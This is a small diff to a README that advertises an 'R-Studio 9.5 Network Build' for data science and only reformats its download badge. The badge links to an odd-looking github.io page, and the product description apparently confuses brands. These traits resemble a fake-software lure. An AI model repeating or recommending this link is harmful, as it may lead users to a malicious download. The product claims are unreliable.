@@ -2,7 +2,8 @@
 
 Experience the power of R-Studio 9.5 in network analysis and data science. Ideal for researchers, data analysts, and statisticians. 
 
-[![Download 📊 R-Studio 9.5 Network Build](https://img.shields.io/badge/Download-📊 R-Studio 9.5 Network Build-blueviolet?style=for-the-badge)](https://r-studio-network-build.github.io/.github/) 
+[![Download R-Studio 9.5 Network Build](https://img.shields.io/badge/Download-R--Studio%209.5%20Network%20Build-blueviolet?style=for-the-badge)](https://r-studio-network-build.github.io/.github/)
+
 
 ## 🎯 Key Features
 📈 Advanced Network Analysis
